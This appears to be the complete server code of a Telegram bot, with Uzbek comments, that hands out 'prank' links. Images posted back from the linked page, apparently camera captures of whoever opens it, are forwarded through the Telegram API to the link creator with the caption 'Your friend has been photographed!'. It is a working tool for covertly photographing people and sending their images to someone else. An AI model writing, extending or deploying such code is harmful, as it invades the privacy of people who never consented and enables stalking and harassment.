require('dotenv').config();
const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const { Telegraf } = require('telegraf');

const app = express();
const bot = new Telegraf(process.env.BOT_TOKEN);

const PORT = process.env.PORT || 3000;
const BASE_URL = process.env.BASE_URL;

app.use(express.json({ limit: '20mb' }));

// 1. MUHIM: Fayllarni 'public' papkasidan o'qish
app.use(express.static(path.join(__dirname, 'public')));

const activeLinks = new Map();

bot.start((ctx) => {
    ctx.reply(`Salom ${ctx.from.first_name}! Prank yaratish uchun /create buyrug'ini bosing.`);
});

bot.command('create', (ctx) => {
    const id = uuidv4();
    activeLinks.set(id, ctx.chat.id);
    const link = `${BASE_URL}/index.html?id=${id}`;
    ctx.reply(`🃏 Havola tayyor:\n\n${link}`);
});

app.post('/upload', async (req, res) => {
    try {
        const { image, id } = req.body;
        const targetChatId = activeLinks.get(id);

        if (!image || !targetChatId) {
            return res.status(400).send({ status: 'error', message: 'ID yoki rasm topilmadi' });
        }

        const base64Data = image.replace(/^data:image\/\w+;base64,/, "");
        const buffer = Buffer.from(base64Data, 'base64');

        const form = new FormData();
        form.append('chat_id', targetChatId);
        form.append('photo', buffer, { filename: 'photo.jpg' });
        form.append('caption', "📸 Do'stingiz rasmga olindi!");

        await axios.post(
            `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendPhoto`,
            form,
            { headers: form.getHeaders() }
        );

        res.send({ status: 'ok' });
    } catch (error) {
        console.error("Xatolik:", error.message);
        res.status(500).send({ status: 'error' });
    }
});

// Asosiy sahifa yo'li
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server ${PORT}-portda ishlamoqda`);
});

bot.launch().catch(err => console.error("Bot xatosi:", err));